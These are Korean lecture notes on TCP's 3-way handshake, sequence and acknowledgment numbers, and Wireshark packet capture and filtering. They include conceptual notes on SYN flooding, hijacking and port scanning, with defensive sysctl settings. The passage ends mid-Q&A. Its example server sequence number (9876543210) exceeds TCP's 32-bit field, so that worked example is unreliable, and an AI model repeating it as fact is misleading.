---
title: "네트워크보안_프로토콜분석_20251202_강의노트"
date: 2025-12-02
excerpt: ""
categories:
  - Linux-Network
tags:
  - Linux-Network
  - SK_Rookies
---

# 📝 네트워크 보안 & 프로토콜 분석 강의 노트 (최종일)

## 📅 강의 정보
- **강의 주제**: TCP/IP 프로토콜 분석, 포트 스캐닝, HTTP/TLS, 네트워크 보안 시스템
- **강의 날짜**: 2025년 12월 2일
- **주요 내용**: 전송 계층 프로토콜(TCP), Wireshark 패킷 분석, Nmap 포트 스캐닝, HTTP/HTTPS, SSL/TLS, 네트워크 보안 장비

---

# Section 1: TCP 3-Way Handshake & Wireshark 패킷 분석 실습

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- TCP 3-Way Handshake의 동작 원리를 완벽히 이해
- Wireshark를 사용한 실시간 패킷 캡처 및 분석 기법
- 시퀀스 번호(Sequence Number)와 확인 응답 번호(Acknowledgment Number)의 역할
- TCP 플래그(SYN, ACK)의 의미와 활용
- 실무에서 활용 가능한 패킷 분석 능력 배양

---

## 📚 이전 강의 복습

### 전송 계층(Transport Layer)이란?

전송 계층은 **OSI 7계층 모델의 4계층**에 해당하며, **TCP/IP 모델에서는 3계층**에 위치합니다. 이 계층의 핵심 역할은:

1. **종단 간(End-to-End) 통신 제공**: 출발지 호스트에서 목적지 호스트까지 데이터 전달
2. **포트 번호를 통한 애플리케이션 식별**: 같은 호스트 내 여러 애플리케이션을 구분
3. **신뢰성 있는 데이터 전송**: TCP의 경우 데이터 손실, 중복, 순서 보장
4. **흐름 제어 및 혼잡 제어**: 네트워크 상태에 따른 전송 속도 조절

### TCP vs UDP 비교

| 특징 | TCP (Transmission Control Protocol) | UDP (User Datagram Protocol) |
|:---:|:---:|:---:|
| **연결 방식** | 연결 지향 (Connection-Oriented) | 비연결 (Connectionless) |
| **신뢰성** | 신뢰성 보장 (재전송, 순서 보장) | 신뢰성 없음 (Best Effort) |
| **속도** | 상대적으로 느림 (오버헤드 존재) | 빠름 (헤더가 단순함) |
| **헤더 크기** | 20~60 바이트 | 8 바이트 |
| **사용 예** | HTTP, HTTPS, FTP, SSH, SMTP | DNS, DHCP, VoIP, 실시간 스트리밍 |
| **흐름 제어** | 있음 (Window Size 조절) | 없음 |
| **혼잡 제어** | 있음 (Slow Start, Congestion Avoidance) | 없음 |

💡 **중요!** 이번 강의에서는 TCP에 집중합니다. TCP는 웹 서비스(HTTP/HTTPS), 파일 전송(FTP), 원격 접속(SSH) 등 신뢰성이 중요한 대부분의 인터넷 서비스에서 사용됩니다.

---

## 🤝 TCP 3-Way Handshake 완전 분석

### 왜 3-Way Handshake가 필요한가?

TCP는 **연결 지향 프로토콜**입니다. 데이터를 전송하기 전에 반드시 **논리적 연결(Connection)**을 먼저 수립해야 합니다. 이 연결 수립 과정이 바로 **3-Way Handshake**입니다.

**3-Way Handshake의 목적:**
1. **양방향 통신 가능 확인**: 클라이언트와 서버 모두 데이터를 주고받을 수 있는지 확인
2. **초기 시퀀스 번호 교환**: 각자의 시작 시퀀스 번호를 상대방에게 알려줌
3. **연결 파라미터 협상**: MSS(Maximum Segment Size), Window Size 등 통신 조건 협상

### 3-Way Handshake 프로세스 상세 설명

```mermaid
sequenceDiagram
    participant Client as 클라이언트<br/>(Active Open)
    participant Server as 서버<br/>(Passive Open)

    Note over Server: LISTEN 상태<br/>(연결 대기)

    Client->>Server: ① SYN<br/>Seq=X (랜덤 값)<br/>Flags: SYN=1
    Note over Client: SYN-SENT 상태

    Note over Server: SYN 수신<br/>SYN-RECEIVED 상태
    Server->>Client: ② SYN+ACK<br/>Seq=Y (랜덤 값)<br/>Ack=X+1<br/>Flags: SYN=1, ACK=1

    Note over Client: SYN+ACK 수신
    Client->>Server: ③ ACK<br/>Seq=X+1<br/>Ack=Y+1<br/>Flags: ACK=1

    Note over Client,Server: ✅ ESTABLISHED 상태<br/>(연결 수립 완료)
```

### 단계별 상세 분석

#### **Step 1: 클라이언트 → 서버 (SYN 패킷 전송)**

**역할**: 클라이언트가 서버에게 "연결하자!"고 요청

**클라이언트 동작**:
- TCP 헤더의 **SYN 플래그를 1로 설정**
- **시퀀스 번호(Sequence Number)**를 랜덤하게 생성 (예: X = 1234567890)
  - 보안상의 이유로 예측 불가능한 랜덤 값 사용
  - 과거에는 순차적 번호를 사용했으나, 이를 악용한 TCP Hijacking 공격 가능
- 패킷을 서버로 전송

**클라이언트 상태 변화**: `CLOSED` → `SYN-SENT`

**서버 동작**:
- 평소에는 `LISTEN` 상태에서 대기
- SYN 패킷 수신

**서버 상태 변화**: `LISTEN` → `SYN-RECEIVED`

**패킷 구조 예시**:
```
TCP Header:
  Source Port: 54321 (클라이언트의 임시 포트)
  Destination Port: 80 (서버의 HTTP 서비스 포트)
  Sequence Number: 1234567890 (랜덤 값 X)
  Acknowledgment Number: 0 (아직 수신한 데이터 없음)
  Flags: SYN=1, ACK=0
  Window Size: 65535 (클라이언트의 수신 버퍼 크기)
```

📌 **노트**:
- **Active Open**: 먼저 연결을 요청하는 쪽 (보통 클라이언트)
- **Passive Open**: 연결 요청을 기다리는 쪽 (보통 서버)

---

#### **Step 2: 서버 → 클라이언트 (SYN+ACK 패킷 전송)**

**역할**: 서버가 클라이언트에게 "너의 SYN 잘 받았어, 나도 연결할게!"라고 응답

**서버 동작**:
- TCP 헤더의 **SYN 플래그와 ACK 플래그를 모두 1로 설정**
- **자신의 시퀀스 번호**를 랜덤하게 생성 (예: Y = 9876543210)
- **확인 응답 번호(Acknowledgment Number)**를 설정: `Ack = X + 1`
  - 의미: "나는 너의 시퀀스 X까지 받았고, 다음엔 X+1부터 보내줘"
- 패킷을 클라이언트로 전송

**서버 상태**: `SYN-RECEIVED` 유지

**클라이언트 동작**:
- SYN+ACK 패킷 수신

**패킷 구조 예시**:
```
TCP Header:
  Source Port: 80 (서버의 HTTP 서비스 포트)
  Destination Port: 54321 (클라이언트의 임시 포트)
  Sequence Number: 9876543210 (랜덤 값 Y)
  Acknowledgment Number: 1234567891 (X+1, "X까지 받았어")
  Flags: SYN=1, ACK=1
  Window Size: 29200 (서버의 수신 버퍼 크기)
```

💡 **중요!**
- 이 패킷은 **두 가지 의미를 동시에 전달**합니다:
  1. **SYN**: "나도 연결하고 싶어, 내 시퀀스 번호는 Y야"
  2. **ACK**: "너의 SYN(시퀀스 X) 잘 받았어"

---

#### **Step 3: 클라이언트 → 서버 (ACK 패킷 전송)**

**역할**: 클라이언트가 서버에게 "너의 SYN도 잘 받았어!"라고 확인

**클라이언트 동작**:
- TCP 헤더의 **ACK 플래그를 1로 설정**
- **시퀀스 번호**를 증가: `Seq = X + 1`
- **확인 응답 번호**를 설정: `Ack = Y + 1`
  - 의미: "나는 너의 시퀀스 Y까지 받았고, 다음엔 Y+1부터 보내줘"
- 패킷을 서버로 전송

**클라이언트 상태 변화**: `SYN-SENT` → `ESTABLISHED` ✅

**서버 동작**:
- ACK 패킷 수신

**서버 상태 변화**: `SYN-RECEIVED` → `ESTABLISHED` ✅

**패킷 구조 예시**:
```
TCP Header:
  Source Port: 54321
  Destination Port: 80
  Sequence Number: 1234567891 (X+1)
  Acknowledgment Number: 9876543211 (Y+1, "Y까지 받았어")
  Flags: SYN=0, ACK=1
  Window Size: 65535
```

**✅ 연결 수립 완료!**

이제 클라이언트와 서버는 모두 `ESTABLISHED` 상태가 되어 **데이터를 주고받을 수 있습니다**.

---

### 시퀀스 번호(Sequence Number)와 확인 응답 번호(Acknowledgment Number)의 의미

#### 시퀀스 번호(Sequence Number)란?

**정의**: 전송하는 데이터의 **첫 번째 바이트 위치**를 나타내는 번호

**역할**:
1. **데이터 순서 보장**: 패킷이 순서대로 도착하지 않아도 재조립 가능
2. **중복 탐지**: 같은 시퀀스 번호가 다시 오면 중복 패킷으로 판단
3. **데이터 범위 식별**: "이 패킷은 전체 데이터 스트림의 어느 위치인가?"

**동작 방식**:
- 초기 시퀀스 번호(ISN, Initial Sequence Number)는 **랜덤하게 생성**
- 이후 전송할 때마다 **데이터 크기만큼 증가**
- 예: 시퀀스 번호 1000인 패킷에 500바이트 데이터 전송 → 다음 시퀀스 번호는 1500

**예시**:
```
1번째 패킷: Seq=1000, 데이터=500바이트 전송
2번째 패킷: Seq=1500, 데이터=300바이트 전송
3번째 패킷: Seq=1800, 데이터=200바이트 전송
```

#### 확인 응답 번호(Acknowledgment Number)란?

**정의**: "다음에 받고 싶은 바이트 번호"를 알려주는 번호

**역할**:
1. **수신 확인**: "여기까지는 잘 받았어"
2. **다음 데이터 요청**: "다음엔 이 번호부터 보내줘"
3. **흐름 제어**: 수신 버퍼 상태를 간접적으로 전달

**계산 방식**:
```
Ack Number = 상대방의 Sequence Number + 수신한 데이터 크기
```

**예시**:
```
클라이언트가 Seq=1000, 데이터 500바이트 전송
→ 서버는 Ack=1500으로 응답 ("1500부터 보내줘")

서버가 Seq=2000, 데이터 300바이트 전송
→ 클라이언트는 Ack=2300으로 응답 ("2300부터 보내줘")
```

#### 3-Way Handshake에서의 시퀀스/확인 응답 번호 흐름

```
① 클라이언트 → 서버: SYN
   Seq = X (예: 100)
   데이터 없음 (하지만 SYN 플래그 자체가 1바이트로 간주됨)

② 서버 → 클라이언트: SYN+ACK
   Seq = Y (예: 500)
   Ack = X + 1 = 101 ("101부터 보내줘")

③ 클라이언트 → 서버: ACK
   Seq = X + 1 = 101
   Ack = Y + 1 = 501 ("501부터 보내줘")
```

💡 **중요!** SYN과 FIN 플래그는 **데이터가 없어도 1바이트를 차지**하는 것으로 간주합니다. 따라서 Ack Number가 +1 증가합니다.

---

### TCP 플래그(Flags) 상세 분석

TCP 헤더에는 **6개의 제어 플래그**가 있으며, 각각 1비트로 표현됩니다.

| 플래그 | 약자 | 의미 | 사용 목적 |
|:---:|:---:|:---:|:---:|
| **URG** | Urgent | 긴급 데이터 | 긴급 포인터 필드 유효성 표시 (거의 사용 안 함) |
| **ACK** | Acknowledgment | 확인 응답 | 확인 응답 번호 필드 유효성 표시 |
| **PSH** | Push | 즉시 전달 | 버퍼링 없이 즉시 애플리케이션에 전달 |
| **RST** | Reset | 연결 재설정 | 비정상적인 연결 종료 (강제 종료) |
| **SYN** | Synchronize | 동기화 | 연결 수립 시 시퀀스 번호 동기화 |
| **FIN** | Finish | 연결 종료 | 정상적인 연결 종료 |

#### 3-Way Handshake에서 사용되는 플래그

**1단계 (SYN)**:
```
Flags: URG=0, ACK=0, PSH=0, RST=0, SYN=1, FIN=0
비트 표현: 000010 (16진수: 0x02)
```

**2단계 (SYN+ACK)**:
```
Flags: URG=0, ACK=1, PSH=0, RST=0, SYN=1, FIN=0
비트 표현: 010010 (16진수: 0x12)
```

**3단계 (ACK)**:
```
Flags: URG=0, ACK=1, PSH=0, RST=0, SYN=0, FIN=0
비트 표현: 010000 (16진수: 0x10)
```

⚠️ **주의**:
- **RST 플래그**가 설정된 패킷은 비정상 종료를 의미합니다.
- 포트 스캔 탐지 시 자주 보이며, 방화벽에서 차단된 경우에도 RST 패킷이 반환됩니다.

---

## 🔬 Wireshark를 활용한 3-Way Handshake 실습

### Wireshark란?

**Wireshark**는 세계에서 가장 널리 사용되는 **오픈소스 네트워크 프로토콜 분석 도구**입니다.

**주요 기능**:
- 실시간 패킷 캡처 (Live Capture)
- 다양한 프로토콜 디코딩 (1000+ 프로토콜 지원)
- 강력한 디스플레이 필터 (Display Filter)
- 패킷 내용 상세 분석 (Hex/ASCII 뷰)
- 통계 및 그래프 생성

**활용 분야**:
- 네트워크 문제 해결 (Troubleshooting)
- 보안 분석 (Security Analysis)
- 프로토콜 개발 및 디버깅
- 네트워크 성능 분석
- 교육 및 학습

---

### 실습 환경 구성

#### 사전 준비사항

1. **Wireshark 설치**
   - 공식 사이트: https://www.wireshark.org/
   - Windows/macOS/Linux 모두 지원
   - 설치 시 **Npcap**(Windows) 또는 **libpcap**(Linux/macOS) 함께 설치 필요

2. **관리자 권한**
   - 패킷 캡처는 **관리자 권한**이 필요합니다
   - Windows: "관리자 권한으로 실행"
   - Linux/macOS: `sudo wireshark` 또는 권한 설정

3. **테스트 대상 웹사이트**
   - 강의에서는 `dictionary.cambridge.org` 사용
   - 다른 웹사이트 사용 가능 (예: `www.naver.com`, `www.google.com`)

---

### 📟 실습 Step 1: Wireshark 실행 및 인터페이스 선택

#### 1-1. Wireshark 실행

Wireshark를 실행하면 다음과 같은 초기 화면이 나타납니다:

```
┌─────────────────────────────────────────────────────────┐
│ Wireshark - Capture                                     │
├─────────────────────────────────────────────────────────┤
│ Interface Name          Description          Packets/s  │
│ ───────────────────────────────────────────────────────│
│ ▶ Ethernet              이더넷 어댑터         125       │
│ ▶ Wi-Fi                 무선 LAN 어댑터       87        │
│ ▶ Loopback              루프백               0         │
│ ▶ Bluetooth             블루투스             0         │
└─────────────────────────────────────────────────────────┘
```

#### 1-2. 네트워크 인터페이스 선택

**인터페이스란?**
- 컴퓨터와 네트워크를 연결하는 물리적/논리적 통로
- 이더넷 카드, Wi-Fi 어댑터, 루프백 등

**선택 기준**:
- 인터넷에 연결된 인터페이스 선택
- 유선 연결: **Ethernet** 또는 **이더넷 어댑터**
- 무선 연결: **Wi-Fi** 또는 **무선 LAN 어댑터**
- `Packets/s` 컬럼에서 패킷이 활발하게 오가는 인터페이스 확인

**선택 방법**:
1. 사용 중인 인터페이스 더블클릭
2. 또는 인터페이스 선택 후 **Start** 버튼 클릭

📌 **노트**: 로컬 테스트를 위해서는 `Loopback` 인터페이스를 선택할 수도 있습니다 (127.0.0.1 통신 분석 시).

---

### 📟 실습 Step 2: 캡처 시작 전 필터 준비

#### 2-1. 캡처 일시 중지

인터페이스를 선택하면 **즉시 패킷 캡처가 시작**됩니다. 하지만 우리는 준비 과정이 필요하므로:

1. 상단 툴바에서 **빨간색 Stop 버튼** 클릭
2. 또는 `Ctrl + E` (캡처 중지)

#### 2-2. 대상 웹사이트의 IP 주소 확인

**왜 IP 주소가 필요한가?**
- Wireshark는 모든 네트워크 트래픽을 캡처합니다 (수백~수천 개 패킷)
- 특정 웹사이트와의 통신만 필터링하려면 **IP 주소 기반 필터** 필요
- 도메인 이름이 아닌 IP 주소로 필터링해야 정확함

**nslookup 명령어 사용**:

Windows PowerShell 또는 명령 프롬프트에서:

```bash
nslookup dictionary.cambridge.org
```

**실행 결과 예시**:
```
서버:    kns.kornet.net
Address:  168.126.63.1

권한 없는 응답:
이름:    dictionary.cambridge.org
Addresses:  151.101.2.132
           151.101.66.132
           151.101.130.132
           151.101.194.132
```

💡 **중요!**
- 응답에서 **Addresses** 부분의 IP 주소를 메모합니다
- 여러 개의 IP가 나올 수 있습니다 (로드 밸런싱)
- 실습 시 이 중 **하나 또는 모두** 사용 가능

**IP 주소 메모 예시**:
```
151.101.2.132
151.101.66.132
```

📌 **노트**:
- DNS는 동적으로 IP를 변경할 수 있으므로, 실습 시점에 따라 다른 IP가 나올 수 있습니다.
- 여러 개의 IP는 CDN(Content Delivery Network) 또는 로드 밸런서를 사용하는 경우입니다.

#### 2-3. Wireshark 디스플레이 필터 설정

Wireshark 상단의 **디스플레이 필터 입력창**에 다음과 같이 입력:

**방법 1: 단일 IP 필터**
```
ip.addr == 151.101.2.132
```

**방법 2: 여러 IP 필터 (OR 조건)**
```
ip.addr == 151.101.2.132 || ip.addr == 151.101.66.132
```

**방법 3: IP 대역 필터 (더 넓은 범위)**
```
ip.addr == 151.101.0.0/16
```

**필터 문법 설명**:
- `ip.addr`: 출발지 또는 목적지 IP 주소
- `==`: 같다 (equal)
- `||`: 또는 (OR)
- `/16`: 서브넷 마스크 (CIDR 표기법)

⚠️ **주의**:
- 필터를 **적용하지 않고**(Apply 버튼 누르지 않음) 다음 단계로 진행
- 캡처는 **필터 없이** 모든 패킷을 받고, 나중에 **디스플레이 필터로 보기만** 제한하는 것이 좋습니다

---

### 📟 실습 Step 3: 패킷 캡처 시작 및 웹사이트 접속

#### 3-1. 캡처 시작

1. Wireshark 상단의 **파란색 Shark Fin 버튼** 클릭 (또는 `Ctrl + E`)
2. 패킷이 실시간으로 캡처되기 시작합니다

```
Time          Source          Destination     Protocol  Info
0.000000      192.168.0.100   8.8.8.8         DNS       Standard query A dictionary.cambridge.org
0.045123      8.8.8.8         192.168.0.100   DNS       Standard query response
0.098234      192.168.0.100   151.101.2.132   TCP       54321 → 443 [SYN] Seq=0
0.134567      151.101.2.132   192.168.0.100   TCP       443 → 54321 [SYN, ACK] Seq=0 Ack=1
0.134890      192.168.0.100   151.101.2.132   TCP       54321 → 443 [ACK] Seq=1 Ack=1
... (계속)
```

#### 3-2. 웹 브라우저에서 접속

새 브라우저 창을 열고:

```
https://dictionary.cambridge.org
```

접속하면 Wireshark에 **수많은 패킷**이 캡처됩니다.

#### 3-3. 캡처 중지

충분한 패킷이 캡처되면 (약 5~10초):

1. Wireshark 상단의 **빨간색 Stop 버튼** 클릭
2. 또는 `Ctrl + E`

---

### 📟 실습 Step 4: 디스플레이 필터 적용 및 3-Way Handshake 패킷 찾기

#### 4-1. 필터 적용

앞서 설정한 필터가 입력되어 있다면 **Enter 키** 또는 **Apply 버튼** 클릭

```
ip.addr == 151.101.2.132
```

필터가 적용되면:
- 화면이 **해당 IP와 관련된 패킷만** 표시
- 패킷 수가 수백 개에서 수십 개로 줄어듦

#### 4-2. 3-Way Handshake 패킷 찾기

패킷 목록을 **위에서부터** 살펴보면 다음과 같은 순서로 나타납니다:

```
No.  Time      Source          Destination     Protocol  Info
1    0.000000  192.168.0.100   151.101.2.132   TCP       54321 → 443 [SYN] Seq=0 Win=65535 Len=0
2    0.045123  151.101.2.132   192.168.0.100   TCP       443 → 54321 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0
3    0.045456  192.168.0.100   151.101.2.132   TCP       54321 → 443 [ACK] Seq=1 Ack=1 Win=65535 Len=0
```

**Info 컬럼 해석**:
- `[SYN]`: SYN 플래그만 설정
- `[SYN, ACK]`: SYN과 ACK 플래그 모두 설정
- `[ACK]`: ACK 플래그만 설정
- `→`: 방향 표시
- `Seq=`: Sequence Number
- `Ack=`: Acknowledgment Number
- `Win=`: Window Size (수신 버퍼 크기)
- `Len=`: 데이터 길이 (3-Way Handshake는 데이터 없음, Len=0)

💡 **중요!**
- 포트 443은 HTTPS (TLS를 사용하는 암호화된 HTTP)
- 포트 80은 HTTP (암호화되지 않은 HTTP)
- 최근 대부분의 웹사이트는 HTTPS 사용

---

### 📟 실습 Step 5: SYN 패킷 상세 분석

#### 5-1. SYN 패킷 선택

패킷 목록에서 **첫 번째 [SYN] 패킷** 클릭

#### 5-2. 패킷 세부 정보 창 확인

Wireshark 중간 부분에 **계층별 프로토콜 트리**가 표시됩니다:

```
▼ Frame 1: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)
▼ Ethernet II, Src: Apple_12:34:56 (a4:83:e7:12:34:56), Dst: Netgear_ab:cd:ef (a0:63:91:ab:cd:ef)
▼ Internet Protocol Version 4, Src: 192.168.0.100, Dst: 151.101.2.132
▼ Transmission Control Protocol, Src Port: 54321, Dst Port: 443, Seq: 0, Len: 0
    Source Port: 54321
    Destination Port: 443
    [Stream index: 0]
    Sequence Number: 0    (relative sequence number)
    Sequence Number (raw): 1234567890
    Acknowledgment Number: 0
    Acknowledgment Number (raw): 0
    0110 .... = Header Length: 24 bytes (6)
    Flags: 0x002 (SYN)
        000. .... .... = Reserved: Not set
        ...0 .... .... = Nonce: Not set
        .... 0... .... = Congestion Window Reduced (CWR): Not set
        .... .0.. .... = ECN-Echo: Not set
        .... ..0. .... = Urgent: Not set
        .... ...0 .... = Acknowledgment: Not set
        .... .... 0... = Push: Not set
        .... .... .0.. = Reset: Not set
        .... .... ..1. = Syn: Set
        .... .... ...0 = Fin: Not set
    Window: 65535
    Checksum: 0x1a2b [unverified]
    Urgent Pointer: 0
    Options: (4 bytes), Maximum segment size
        ▶ TCP Option - Maximum segment size: 1460 bytes
```

#### 5-3. 핵심 필드 분석

**Sequence Number (Relative)**:
```
Sequence Number: 0 (relative sequence number)
```
- Wireshark가 **가독성을 위해 0부터 시작**하도록 변환한 값
- 실제로는 랜덤한 큰 숫자

**Sequence Number (Raw)**:
```
Sequence Number (raw): 1234567890
```
- 실제 OS가 생성한 **랜덤 값**
- 보안을 위해 예측 불가능한 값 사용

💡 **중요!** Wireshark는 기본적으로 **Relative Sequence Number**를 사용하여 분석을 쉽게 만듭니다. Raw 값을 보려면 `Edit` → `Preferences` → `Protocols` → `TCP` → `Relative sequence numbers` 체크 해제

**Acknowledgment Number**:
```
Acknowledgment Number: 0
```
- SYN 패킷에서는 아직 수신한 데이터가 없으므로 **0**

**Flags**:
```
Flags: 0x002 (SYN)
    .... .... ..1. = Syn: Set
    (나머지 플래그는 모두 Not set)
```
- **SYN 플래그만 1로 설정**
- 16진수 `0x002`는 이진수 `000010`에 해당

**Window Size**:
```
Window: 65535
```
- 클라이언트의 **수신 버퍼 크기**: 65,535바이트 (64KB)
- 서버가 한 번에 최대 이만큼의 데이터를 보낼 수 있음을 알림

**TCP Options - MSS (Maximum Segment Size)**:
```
TCP Option - Maximum segment size: 1460 bytes
```
- 한 번에 전송할 수 있는 최대 데이터 크기
- 보통 **MTU(1500) - IP 헤더(20) - TCP 헤더(20) = 1460바이트**

---

### 📟 실습 Step 6: SYN+ACK 패킷 상세 분석

#### 6-1. SYN+ACK 패킷 선택

패킷 목록에서 **두 번째 [SYN, ACK] 패킷** 클릭

#### 6-2. 핵심 필드 분석

**Sequence Number**:
```
Sequence Number: 0 (relative sequence number)
Sequence Number (raw): 9876543210
```
- 서버의 **초기 시퀀스 번호 (랜덤 값)**
- 클라이언트의 시퀀스 번호와는 **완전히 별개**

**Acknowledgment Number**:
```
Acknowledgment Number: 1 (relative ack number)
Acknowledgment Number (raw): 1234567891
```
- 클라이언트의 시퀀스 번호(1234567890) + 1 = **1234567891**
- 의미: "나는 1234567890까지 받았고, 다음엔 1234567891부터 보내줘"

💡 **중요!**
- Relative 값으로는 `Ack=1` (0+1)
- Raw 값으로는 `Ack=1234567891` (클라이언트의 ISN + 1)

**Flags**:
```
Flags: 0x012 (SYN, ACK)
    .... ...1 .... = Acknowledgment: Set
    .... .... ..1. = Syn: Set
    (나머지 플래그는 모두 Not set)
```
- **SYN과 ACK 플래그 모두 설정**
- 16진수 `0x012`는 이진수 `010010`에 해당

**Window Size**:
```
Window: 29200
```
- 서버의 수신 버퍼 크기: 29,200바이트
- 클라이언트가 한 번에 최대 이만큼 보낼 수 있음

---

### 📟 실습 Step 7: ACK 패킷 상세 분석

#### 7-1. ACK 패킷 선택

패킷 목록에서 **세 번째 [ACK] 패킷** 클릭

#### 7-2. 핵심 필드 분석

**Sequence Number**:
```
Sequence Number: 1 (relative sequence number)
Sequence Number (raw): 1234567891
```
- 클라이언트의 **다음 시퀀스 번호**
- 이전 SYN 패킷의 시퀀스(1234567890) + 1 = 1234567891

**Acknowledgment Number**:
```
Acknowledgment Number: 1 (relative ack number)
Acknowledgment Number (raw): 9876543211
```
- 서버의 시퀀스 번호(9876543210) + 1 = **9876543211**
- 의미: "나는 9876543210까지 받았고, 다음엔 9876543211부터 보내줘"

**Flags**:
```
Flags: 0x010 (ACK)
    .... ...1 .... = Acknowledgment: Set
    .... .... ..0. = Syn: Not set
    (나머지 플래그는 모두 Not set)
```
- **ACK 플래그만 설정**
- 16진수 `0x010`는 이진수 `010000`에 해당

**✅ 연결 수립 완료!**

이 시점부터 클라이언트와 서버는 **ESTABLISHED 상태**가 되어 데이터를 주고받을 수 있습니다.

---

### 📟 고급 필터링 기법

#### 3-Way Handshake만 정확히 추출하기

강사님이 채팅으로 공유한 필터:

```
tcp.flags.syn==1 || tcp.flags == 0x012
```

**필터 분석**:
- `tcp.flags.syn==1`: SYN 플래그가 설정된 모든 패킷
  - SYN 단독 패킷 (0x002)
  - SYN+ACK 패킷 (0x012)
- `||`: OR 조건
- `tcp.flags == 0x012`: SYN+ACK 패킷만 (명시적)

**더 정확한 필터 (특정 연결의 3-Way Handshake만)**:

```
ip.addr == 151.101.2.132 && tcp.flags.syn==1
```

**설명**:
- 특정 IP와의 통신 중
- SYN 플래그가 포함된 패킷만

**내 IP를 포함한 필터**:

```
ip.src == 192.168.0.100 && tcp.flags.syn==1
```

**설명**:
- 내 IP(192.168.0.100)에서 출발한
- SYN 플래그 패킷만

이렇게 하면 **정확히 3-Way Handshake 과정만** 추출할 수 있습니다.

---

### 📟 실습 Step 8: 캡처 파일 저장

다음 실습(TLS 분석)을 위해 캡처한 패킷을 저장합니다.

#### 8-1. 저장 방법

1. **File** → **Save As** 클릭
2. 또는 `Ctrl + Shift + S`

#### 8-2. 파일 형식 선택

- **파일 이름**: `tcp_3way_handshake_capture.pcapng`
- **파일 형식**: `Pcapng` (Wireshark 기본 형식, 권장)
  - 또는 `Pcap` (다른 도구와 호환성)

#### 8-3. 저장 위치

적절한 폴더에 저장 (예: `C:\Wireshark_Labs\`)

📌 **노트**:
- `.pcapng` 형식은 **메타데이터 지원** (캡처 시간, 인터페이스 정보 등)
- 나중에 `File` → `Open`으로 다시 열어 분석 가능

---

## ✅ 학습 체크리스트

- [ ] TCP 3-Way Handshake의 세 단계를 설명할 수 있다
- [ ] SYN, SYN+ACK, ACK 패킷의 차이를 이해한다
- [ ] 시퀀스 번호와 확인 응답 번호의 역할을 설명할 수 있다
- [ ] Wireshark를 설치하고 패킷 캡처를 시작할 수 있다
- [ ] nslookup으로 도메인의 IP 주소를 확인할 수 있다
- [ ] Wireshark 디스플레이 필터를 사용하여 특정 IP 트래픽을 필터링할 수 있다
- [ ] 캡처한 패킷에서 3-Way Handshake 과정을 찾아낼 수 있다
- [ ] TCP 플래그(SYN, ACK)를 해석할 수 있다
- [ ] Relative와 Raw 시퀀스 번호의 차이를 이해한다
- [ ] 캡처 파일을 저장하고 나중에 다시 열 수 있다

---

## 📋 핵심 요약

### 1. TCP 3-Way Handshake

**연결 수립 과정**:
1. **SYN**: 클라이언트 → 서버 (연결 요청)
2. **SYN+ACK**: 서버 → 클라이언트 (수락 + 연결 요청)
3. **ACK**: 클라이언트 → 서버 (최종 확인)

**상태 변화**:
- 클라이언트: `CLOSED` → `SYN-SENT` → `ESTABLISHED`
- 서버: `LISTEN` → `SYN-RECEIVED` → `ESTABLISHED`

### 2. 시퀀스/확인 응답 번호

**시퀀스 번호**:
- 전송하는 데이터의 첫 번째 바이트 위치
- 초기값은 랜덤 (보안)
- 데이터 크기만큼 증가

**확인 응답 번호**:
- "다음에 받고 싶은 바이트 번호"
- 계산: `상대방 Seq + 데이터 크기`
- SYN/FIN은 1바이트로 간주

### 3. Wireshark 핵심 기능

**디스플레이 필터**:
- `ip.addr == X.X.X.X`: IP 필터
- `tcp.flags.syn==1`: SYN 플래그 필터
- `tcp.port == 443`: 포트 필터

**패킷 분석**:
- Relative Sequence Number: 가독성 향상
- Raw Sequence Number: 실제 값
- TCP Stream: 연결별로 그룹화

### 4. 주요 명령어

**nslookup** (DNS 조회):
```bash
nslookup domain.com
```

**Wireshark 필터 예시**:
```
ip.addr == 151.101.2.132
tcp.flags.syn==1
ip.src == 192.168.0.100 && tcp.port == 443
```

---

## 🔐 보안 고려사항

### TCP 3-Way Handshake 관련 공격

#### 1. SYN Flooding Attack

**공격 원리**:
- 공격자가 대량의 **SYN 패킷**을 서버로 전송
- 서버는 각 SYN에 대해 `SYN-RECEIVED` 상태로 대기
- ACK를 받지 못하면 일정 시간 동안 연결 정보 유지
- 서버의 **연결 큐(Backlog Queue)가 가득 차서** 정상 사용자 연결 불가

**대응 방안**:

**방안 1: SYN Cookie**
```bash
# Linux에서 SYN Cookie 활성화
sudo sysctl -w net.ipv4.tcp_syncookies=1
```
- 효과: 연결 정보를 메모리에 저장하지 않고 쿠키로 인코딩
- 주의사항: TCP 옵션 협상에 제한 발생 가능

**방안 2: 연결 큐 크기 증가**
```bash
# Linux에서 SYN 백로그 큐 크기 증가
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096
```

**방안 3: Timeout 값 조정**
```bash
# SYN-RECEIVED 상태 유지 시간 단축
sudo sysctl -w net.ipv4.tcp_synack_retries=2
```

**검증 방법**:
```bash
# 현재 설정 확인
sysctl net.ipv4.tcp_syncookies
sysctl net.ipv4.tcp_max_syn_backlog

# 연결 상태 확인
netstat -an | grep SYN_RECV | wc -l
```

#### 2. TCP Hijacking

**공격 원리**:
- 시퀀스 번호가 예측 가능하면 공격자가 **중간에 패킷 삽입** 가능
- 세션을 가로채 데이터 변조 또는 명령 주입

**대응 방안**:
- 랜덤한 ISN(Initial Sequence Number) 사용 ✅ (현대 OS는 기본 적용)
- IPsec, TLS 등 **암호화 프로토콜** 사용

#### 3. Port Scanning

**공격 원리**:
- SYN 패킷을 보내 열린 포트 찾기
- 응답이 SYN+ACK: 포트 열림
- 응답이 RST: 포트 닫힘
- 응답 없음: 방화벽에서 차단

**대응 방안**:
- 불필요한 포트 닫기
- 방화벽 규칙 강화
- IDS/IPS로 스캔 탐지

---

## ❓ Q&A

**Q1: 왜 SYN과 ACK를 따로 보내지 않고 SYN+ACK를 함께 보내나요?**

A: **효율성** 때문입니다. 서버는 두 가지 의미를 한 번에 전달합니다:
1. "너의 SYN 잘 받았어" (ACK)
2. "나도 연결하고 싶어" (SYN)

만약 따로 보낸다면 **4-Way Handshake**가 되어 비효율적입니다.

**Q2: 시퀀스 번호가 왜 랜덤인가요?**

A: **보안**입니다. 과거에는 순차적 번호를 사용했으나, 이를 악용한 TCP Hijacking 공격이 발생했습니다. 랜덤 값을 사용하면 공격자가 다음 번호를 예측하기 어렵습니다.

**Q3: Wireshark의 Relative Sequence Number가 0부터 시작하는 이유는?**

